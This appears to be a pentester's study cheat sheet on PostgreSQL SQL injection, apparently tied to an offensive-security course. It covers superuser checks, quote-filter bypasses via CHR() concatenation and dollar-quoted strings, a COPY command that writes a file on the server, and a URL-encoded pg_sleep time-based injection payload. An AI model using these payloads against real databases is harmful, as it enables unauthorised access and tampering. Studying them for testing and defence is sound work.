# PostgreSQL

String manipulation functions: https://www.postgresql.org/docs/14/functions-string.html

### Checklist

- [x] Check if user is DBA: `SELECT current_setting('is_superuser'); //'on' or 'off'`

### Quoted String Bypass

**Piping**

You can select individual characters using their code points (numbers that represent characters) and concatenate them together using the double pipe (||) operator.

> Note: This does not work for all SQL statements. See below for further bypasses.

```
amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
 ?column?
----------
 AWAE
(1 row)
```

**Dollar-quoted String Constants**

[Lexical Structure](https://www.postgresql.org/docs/14/sql-syntax-lexical.html) in PostgreSQL allows other methods to represent strings. One is support for dollar-quoted string constants. Two dollar characters ($$) can be used as a quote (') substitute by themselves, or a single one ($) can indicate the beginning of a "tag". The tag is optional, can contain zero or more characters, and is terminated with a matching dollar ($). If used, this tag is then required at the end of the string as well:

```
SELECT 'AWAE';
SELECT $$AWAE$$;
SELECT $TAG$AWAE$TAG$;

CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;

COPY 1

Query returned successfully in 201 msec.
```

### Time-based Injection

Check if executing as DBA:
```
SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
```
